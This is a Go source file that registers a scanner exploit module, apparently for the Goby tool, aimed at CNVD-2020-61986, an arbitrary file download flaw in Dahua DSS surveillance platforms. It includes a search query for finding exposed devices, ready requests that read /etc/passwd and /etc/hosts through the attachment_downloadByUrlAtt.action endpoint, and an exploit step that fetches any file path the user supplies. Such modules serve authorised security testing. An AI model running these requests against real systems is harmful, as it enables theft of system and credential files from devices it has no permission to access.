package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "Dahua DSS System Arbitrary file download CNVD-2020-61986",
  "Description": "Zhejiang Dahua DSS (Digital Surveillance System) is a comprehensive management platform integrating the management functions of four security subsystems: video, alarm, access control and intercom.\\nZhejiang Dahua Technology Co., Ltd.DSS has arbitrary file download vulnerability, which can be used by attackers to log in the interface to download any file and obtain sensitive information.",
  "Product": "Zhejiang Dahua Technology Co., Ltd. DSS System",
  "Homepage": "https://www.dahuatech.com",
  "DisclosureDate": "2020-10-31",
  "Author": "luckying1314@139.com",
  "GobyQuery": "title=\"DSS-平安城市\"",
  "Level": "2",
  "Impact": "<p><span style=\"font-size: 14px;\">Arbitrary file download or read vulnerability is mainly because when the application system provides the function of file download or read, the application system directly specifies the file path in the file path parameter and does not verify the legitimacy of the file path, resulting in the attacker can jump through the directory (..</span><span style=\"font-size: 14px;\">\\ or..</span><span style=\"font-size: 14px;\">/) way to download or read a file outside the original specified path.</span><span style=\"font-size: 14px;\">The attacker can finally download or read any file on the system through the vulnerability, such as database files, application system source code, password configuration information and other important sensitive information, resulting in the sensitive information leakage of the system</span><br></p>",
  "Recommandation": "<p>The manufacturer has not provided the relevant vulnerability patch link, please pay attention to the manufacturer's home page to update at any time:<span style=\"color: var(--primaryFont-color);\"><a href=\"https://www.dahuatech.com/\">https://www.dahuatech.com/</a></span></p>",
  "References": [
    "https://www.pwnwiki.org/index.php?title=CNVD-2020-61986_%E5%A4%A7%E8%8F%AFDSS%E7%B3%BB%E7%B5%B1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BC%89%E6%BC%8F%E6%B4%9E/zh-cn"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "filePath",
      "type": "createSelect",
      "value": "file:///etc/hosts,file:///etc/passwd",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "OR",
    {
      "Request": {
        "method": "GET",
        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "root",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/hosts",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "localhost",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "GET",
        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath={{{filePath}}}",
        "follow_redirect": true,
        "header": {},
        "data_type": "text",
        "data": ""
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "fileread"
  ],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
